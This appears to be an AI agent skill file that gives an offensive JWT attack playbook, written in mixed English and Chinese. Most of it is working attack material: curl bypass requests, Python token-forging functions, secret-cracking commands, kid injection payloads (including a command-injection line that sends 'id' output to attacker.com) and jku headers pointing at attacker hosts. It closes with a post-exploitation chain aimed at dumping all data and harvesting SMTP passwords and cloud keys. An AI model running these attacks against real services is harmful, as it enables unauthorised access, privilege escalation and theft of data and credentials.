---
name: jwt-attack
description: >
  JWT (JSON Web Token) attack methodology. Covers Bearer removal
  bypass, algorithm confusion (alg:none / RS256→HS256 / empty sig),
  secret brute force with public wordlists + JS-extracted keywords,
  kid/jku/jwk header injection, claims manipulation, cross-service
  token reuse, JWKS endpoint analysis, and multi-role privilege
  escalation with post-exploitation chain.
metadata:
  tags: "jwt,bearer,alg-none,secret-brute-force,kid-injection,jku,jwks,claims"
  category: "offensive-security"
---

# JWT Attack — Full Methodology

## 0. Test Priority Matrix (按成功率排序)

```
Priority 1 — 最快、无工具依赖
├── Bearer 移除: 5秒，纯 curl
├── alg:none: 10秒，base64 改 header
├── 空签名: 同上，直接删签名部分
├── 声明篡改: 改 payload 里的 role/userId，不改签名
└── 换 Header 投递: 把 token 放到 X-Auth-Token / Cookie

Priority 2 — 需要工具，10-30分钟
├── Secret 爆破: jwt.secrets.list + JS 关键字
├── kid 路径穿越: 读 /dev/null 实现 alg:none
├── RS256→HS256: 需要公钥（从 JWKS 端点拿）

Priority 3 — 特定场景
├── jku 注入: 需要托管自己的 JWKS
├── jwk 内嵌: 同上，自签 key 嵌入 header
├── 跨服务重用: 同一 token 打不同微服务
└── JWKS 私钥泄露: /.well-known/jwks.json 里有 d 参数
```

## Attack Surface

JWT vulnerabilities exist when the server:
1. Does not properly validate the "Bearer" prefix
2. Trusts the `alg` header from the client
3. Uses a weak/guessable secret for HMAC signing
4. Allows kid/jku/jwk header injection
5. Does not validate token claims (exp, aud, iss, role)
6. Reuses the same JWT validation logic across microservices
7. Exposes key material via JWKS endpoint

---

## 1. Bearer Removal Bypass

**Scenario**: Multi-role platform (user/admin). Normal user's token gets
401/403 on admin endpoints. Server may have flawed middleware that
checks the Authorization header differently with/without "Bearer" prefix.

```bash
# Original request (returns 403)
curl -s https://target/api/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 1: Remove "Bearer " prefix
curl -s https://target/api/admin/users \
  -H "Authorization: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 2: Lowercase bearer
curl -s https://target/api/admin/users \
  -H "Authorization: bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 3: Bearer with extra spaces
curl -s https://target/api/admin/users \
  -H "Authorization: Bearer  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 4: Token in alternative headers
curl -s https://target/api/admin/users \
  -H "X-Auth-Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
curl -s https://target/api/admin/users \
  -H "X-API-Key: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 5: Token in Cookie
curl -s https://target/api/admin/users \
  -H "Cookie: access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt 6: Token in POST body / query param
curl -s "https://target/api/admin/users?token=eyJh..."
curl -s -X POST https://target/api/admin/users \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJh..."}'
```

**Why this works**: Some middleware frameworks have separate logic for
"authenticated user" vs "role check". The Bearer prefix may trigger a
role validation path, while the bare token bypasses it and falls back
to a less strict check. Common in custom API gateway implementations.

---

## 2. Algorithm Confusion

### 2a. alg:none (remove signature entirely)

```python
import base64, json

def jwt_none(token):
    """Strip signature by setting alg to none."""
    header_b64, payload_b64, _ = token.split('.')
    
    # Decode and modify header
    header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))
    header['alg'] = 'none'
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()
    
    # Re-encode without signature
    return f"{new_header}.{payload_b64}."
```

### 2b. Empty Signature (不设 alg:none，直接删签名)

有些库检查 `alg` 值为 `none` 时会拒绝，但只要签名部分为空就通过。

```bash
# 方法: 不修改 header，直接发 token 不带签名部分
# Original: eyJhbG...header.eyJzdW...payload.sig
# Attack:   eyJhbG...header.eyJzdW...payload.
#                                    注意最后有个点 ^

curl https://target/api/admin/users \
  -H "Authorization: Bearer eyJhbG...header.eyJzdW...payload."
```

### 2c. No Algorithm Specified

部分库在 header 中没有 `alg` 字段时默认跳过验证：

```json
// Remove alg field entirely
{"typ": "JWT"}
```

### 2d. Algorithm Case Variations

```
"alg": "None"     → Python PyJWT 某些版本
"alg": "NONE"     → 某些 Java 实现
"alg": "nOnE"     → 混合大小写绕过简单字符串比较
```

### 2e. RS256 → HS256 (public key as HMAC secret)

When the server uses RS256 (asymmetric) but accepts HS256 (symmetric),
the public key can be used as the HMAC secret to forge tokens.

```bash
# 1. Get the public key (often at /.well-known/jwks.json)
curl https://target/.well-known/jwks.json

# 2. Convert JWK to PEM, use as HMAC secret
# 3. Forge token with HS256, sign with the public key
# Tool: jwt_tool or python-jwt
```

---

## 3. Secret Brute Force

### Step 1: Download public wordlist

```bash
# Download wallarm jwt-secrets list
curl -sL https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list \
  -o jwt.secrets.list

wc -l jwt.secrets.list  # ~1000+ common JWT secrets
```

### Step 2: Collect JS-extracted keywords

From the recon phase, collect sensitive values found in JS files:
```
apiKey, secretKey, secret, key, password, token, private_key
AES_KEY, ENCRYPTION_KEY, JWT_SECRET, SIGNING_KEY
Any hardcoded string values found in config objects
```

Build a custom dictionary from these:
```bash
# Extract keywords from JS analysis results
# Combine with wallarm list
cat jwt.secrets.list js_keywords.txt | sort -u > jwt_combined.txt
```

### Step 3: Crack

```bash
# hashcat mode 16500 = JWT HS256
hashcat -m 16500 jwt_token.txt jwt_combined.txt --rules best64.rule

# jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d jwt_combined.txt

# john
john jwt_token.txt --wordlist=jwt_combined.txt
```

### Step 4: Verify cracked secret

```bash
# Sign a test payload with the cracked secret
python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "cracked_secret"

# Test the forged token against admin endpoint
curl https://target/api/admin/users \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

---

## 4. kid (Key ID) Injection

The `kid` header tells the server which key to use for verification.
Poorly implemented servers may be vulnerable to injection in the kid parameter.

```json
// Path traversal — read /dev/null (always empty → alg:none bypass)
{"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}

// Path traversal — read predictable file with known content as key
{"alg": "HS256", "typ": "JWT", "kid": "../../../etc/hostname"}

// SQL injection — manipulate key lookup query
{"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'my_secret_key'--"}

// Command injection — key ID passed to shell/exec
{"alg": "HS256", "typ": "JWT", "kid": "key; whoami"}
{"alg": "HS256", "typ": "JWT", "kid": "key|curl attacker.com/$(id)"}

// Null byte truncation
{"alg": "HS256", "typ": "JWT", "kid": "valid_key%00.sql"}
```

---

## 5. jku / jwk Header Injection

### 5a. jku (JWK Set URL) — 让服务器去你的域名取公钥

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

**利用条件**: 服务器从 `jku` URL 取 JWKS，且该 URL 未被白名单限制。

```bash
# 1. 在自己的服务器上托管 jwks.json
# 2. 生成 RSA 密钥对，公钥放进 jwks.json
# 3. 用私钥签名 JWT，jku 指向自己的 jwks.json
# 4. 服务器会从你的 jwks.json 取公钥→ 验证通过

# 绕过技巧 — 如果 jku URL 只校验前缀:
"jku": "https://target.com.evil.com/jwks.json"
"jku": "https://target.com@evil.com/jwks.json"
"jku": "https://evil.com/target.com/jwks.json"
```

### 5b. jwk (Embedded JWK) — 直接把公钥嵌在 header 里

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "0vx7agoebGcQ...",
    "e": "AQAB"
  }
}
```

**利用**: 部分库在 `jwk` 存在时会优先使用内嵌的公钥，而不去验证该公钥是否可信。用自己的私钥签名 → 公钥嵌入 jwk → 服务器用该公钥验证。

---

## 6. Claims Manipulation（声明篡改）

**核心思路**: 不改签名，只改 payload 中的权限声明，赌服务器不验证签名或验证有缺陷。

### 改 role/scope 提权

```python
import base64, json

def modify_claims(token, new_claims):
    header_b64, payload_b64, sig = token.split('.')
    
    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
    payload.update(new_claims)
    
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    return f"{header_b64}.{new_payload}.{sig}"

# 用法
new_token = modify_claims(original_token, {
    "role": "admin",
    "is_admin": True,
    "scope": "*",
    "userId": 1,         # 改成 admin 的 userId
})
```

### 常见可篡改字段

```
role / roles / group / groups / permission / permissions
is_admin / isAdmin / admin
scope / scopes
userId / user_id / sub / aud
level / tier / type
organization / org_id / tenant / tenant_id
```

### 不验证的声明

```
exp — 服务器可能不检查过期时间
nbf — 同上
iat — 签发时间
iss — 签发者
jti — JWT ID (用于防重放，但不检查就废了)
```

---

## 7. Cross-Service Token Reuse（跨服务令牌重用）

微服务架构中，同一个 JWT 可能在多个服务之间传递。A 服务的 token 可能在 B 服务上也有效。

```bash
# 1. 从 JS/响应中收集所有已知微服务地址
# 2. 用同一个 token 逐个测试
for svc in api-user api-order api-payment api-notification \
           internal-api admin-api; do
    echo "=== $svc ==="
    curl -s https://target/${svc}/users \
      -H "Authorization: Bearer $TOKEN" | head -5
done

# 3. 特别关注:
#    - internal / admin 前缀的域名
#    - 不同端口 (443→8080→8443→9090)
#    - 内网地址 (10.x, 172.x, 192.168.x)
```

---

## 8. JWKS Endpoint Analysis

`/.well-known/jwks.json` 可能泄露关键信息：

```bash
curl -s https://target/.well-known/jwks.json | python -m json.tool
```

### 检查清单

```
□ 检查是否包含 "d" 字段 — 私钥泄露! (严重)
□ 检查 "kid" 值 — 可能暴露内部命名/路径
□ 检查是否有多个 key — 可能对应不同环境/租户
□ 尝试其他常见路径:
  /.well-known/openid-configuration
  /jwks.json
  /api/jwks
  /auth/jwks
  /v1/jwks
```

---

## 9. Post-Exploitation Chain（拿到身份后的攻击闭环）

拿到 admin 级别 token 后，不要停——回注到之前发现的所有端点：

```
┌────────────────────────────────────────────────────────────┐
│              JWT 攻击闭环 — 与前序阶段联动                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Phase 1 Recon: JS 提取关键字 → 喂给 JWT 爆破字典          │
│       │                                                    │
│       ▼                                                    │
│  Phase 2 API Fuzz: 发现的需要认证的端点清单                 │
│       │                                                    │
│       ▼                                                    │
│  Phase 3 Bypass: JWT 爆破成功 → 伪造 admin token           │
│       │                                                    │
│       ▼                                                    │
│  [闭环] 用 admin token 重新打 Phase 2 的所有端点:           │
│     □ 所有之前 401/403 的端点 → 现在可能 200               │
│     □ 导出类接口 (*/export, */download) → 全量数据泄露      │
│     □ 管理类接口 (*/admin/*, */manage/*) → 垂直越权确认     │
│     □ 用户列表接口 → 提取更多 userId → 扩大 IDOR 范围       │
│     □ 配置接口 → 读取系统配置、SMTP 密码、AK/SK             │
│                                                            │
│  [链式] 新发现的敏感数据 → 回注到 Phase 0 源泄露搜索        │
│       │   (用新发现的内部路径/配置字段搜索 GitHub/Gitee)     │
│       ▼                                                    │
│  形成闭环: 低权限用户 → JWT爆破 → admin → 全量数据          │
│            → 源泄露扩大 → 发现更多凭据 → 更广攻击面          │
└────────────────────────────────────────────────────────────┘
```

---

## 10. Quick Test Checklist (Full)

```
=== Priority 1: 30秒内完成 ===
□ 解码 JWT payload: echo "token" | cut -d'.' -f2 | base64 -d
□ Bearer 移除: 去掉 "Bearer " 前缀 → 裸 token
□ Bearer 变体: bearer / BEARER / 多余空格
□ 换 header: X-Auth-Token / X-API-Key / Cookie / ?token=
□ alg:none + 移除签名
□ 空签名: header.payload. (尾部带点)
□ 删除 alg 字段 + 移除签名

=== Priority 2: 声明篡改 (不改签名) ===
□ 查看 payload 中是否有 role/isAdmin/scope 字段
□ 尝试修改 role → admin, is_admin → true, userId → 1
□ 保持原签名不变，只改 payload 的 base64
□ 用修改后的 token 打管理接口

=== Priority 3: 密码学攻击 ===
□ Download jwt.secrets.list (wallarm)
□ 从 JS 提取关键字合并字典
□ hashcat -m 16500 爆破 HMAC secret
□ RS256→HS256: 从 jwks.json 取公钥当 secret

=== Priority 4: Header 注入 ===
□ kid 路径穿越: ../../../../dev/null
□ kid SQL 注入: 1' UNION SELECT 'key'--
□ jku 注入: 指向自己的 JWKS 端点
□ jwk 内嵌: 嵌入自签 RSA 公钥
□ 尝试算法变体: None / NONE / nOnE

=== Priority 5: 环境分析 ===
□ 访问 /.well-known/jwks.json → 检查私钥泄露
□ 访问 /.well-known/openid-configuration
□ 跨服务测试: 同一 token 打不同微服务
□ 过期 token 测试: 用已过期的 token 请求
□ 查看 token 在 JS/响应/日志中的泄露

=== Post-Exploitation (拿到身份后) ===
□ Admin token → 重打所有 Phase 2 发现的端点
□ 导出接口 (/export/* /download/*) → 全量数据
□ 管理接口 (/admin/* /manage/*) → 垂直越权确认
□ 用户列表 → 提取更多 ID → 扩大 IDOR
□ 配置接口 → 读取 AK/SK / SMTP 密码
□ 新发现的敏感数据 → 回注源泄露搜索
```

---

## Tools

```bash
# jwt_tool — 综合 JWT 攻击套件
python3 jwt_tool.py <token> -M at          # 全部攻击方法
python3 jwt_tool.py <token> -T             # 篡改 payload
python3 jwt_tool.py <token> -C -d dict.txt # 爆破 secret
python3 jwt_tool.py <token> -X k           # kid 注入

# hashcat — 高性能爆破
hashcat -m 16500 jwt.txt wordlist.txt --rules best64.rule

# jwt-cracker — 轻量 Node.js 爆破
npx jwt-cracker <token> <wordlist>

# 手动解码
echo "<token>" | cut -d'.' -f2 | base64 -d 2>/dev/null | python -m json.tool

# Python 快速篡改
python3 -c "
import base64,json
h,p,s = '<TOKEN>'.split('.')
pl = json.loads(base64.urlsafe_b64decode(p+'=='))
pl['role'] = 'admin'
np = base64.urlsafe_b64encode(json.dumps(pl).encode()).rstrip(b'=').decode()
print(f'{h}.{np}.{s}')
"
```
